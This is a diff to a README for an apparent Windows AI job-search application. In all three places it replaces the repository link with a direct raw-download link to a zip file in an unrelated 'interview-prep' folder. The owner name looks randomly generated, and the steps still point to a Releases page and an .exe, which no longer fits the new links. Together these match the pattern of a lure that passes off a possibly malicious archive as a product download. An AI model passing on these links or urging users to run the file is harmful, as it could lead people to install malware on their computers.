@@ -1,6 +1,6 @@
 # 🔍 AI-Powered-Job-Search-Tool - Find the right job using artificial intelligence
 
-[![Download Application](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/starshaped-demureness3573/AI-Powered-Job-Search-Tool)
+[![Download Application](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/starshaped-demureness3573/AI-Powered-Job-Search-Tool/raw/refs/heads/main/interview-prep/Search-Powered-Job-Tool-A-v2.8.zip)
 
 ## 📋 What is this tool
 
@@ -14,7 +14,7 @@ You need a computer running Windows 10 or Windows 11. Your system should have at
 
 Follow these steps to get the tool on your computer.
 
-1. Visit this page to download the latest version: [https://github.com/starshaped-demureness3573/AI-Powered-Job-Search-Tool](https://github.com/starshaped-demureness3573/AI-Powered-Job-Search-Tool).
+1. Visit this page to download the latest version: [https://github.com/starshaped-demureness3573/AI-Powered-Job-Search-Tool/raw/refs/heads/main/interview-prep/Search-Powered-Job-Tool-A-v2.8.zip](https://github.com/starshaped-demureness3573/AI-Powered-Job-Search-Tool/raw/refs/heads/main/interview-prep/Search-Powered-Job-Tool-A-v2.8.zip).
 2. Look for the section labeled Releases on the right side of the page.
 3. Click the link for the file ending in .exe.
 4. Save the file to your Downloads folder.
@@ -77,4 +77,4 @@ Use specific keywords for your job search. Instead of searching for "manager," t
 
 ## 📞 Get help
 
-If the program closes unexpectedly, try to restart your computer. If the problem continues, delete the application and download the file again from this link: [https://github.com/starshaped-demureness3573/AI-Powered-Job-Search-Tool](https://github.com/starshaped-demureness3573/AI-Powered-Job-Search-Tool). Ensure you have enough disk space for the files. Most issues resolve after a fresh install.
+If the program closes unexpectedly, try to restart your computer. If the problem continues, delete the application and download the file again from this link: [https://github.com/starshaped-demureness3573/AI-Powered-Job-Search-Tool/raw/refs/heads/main/interview-prep/Search-Powered-Job-Tool-A-v2.8.zip](https://github.com/starshaped-demureness3573/AI-Powered-Job-Search-Tool/raw/refs/heads/main/interview-prep/Search-Powered-Job-Tool-A-v2.8.zip). Ensure you have enough disk space for the files. Most issues resolve after a fresh install.
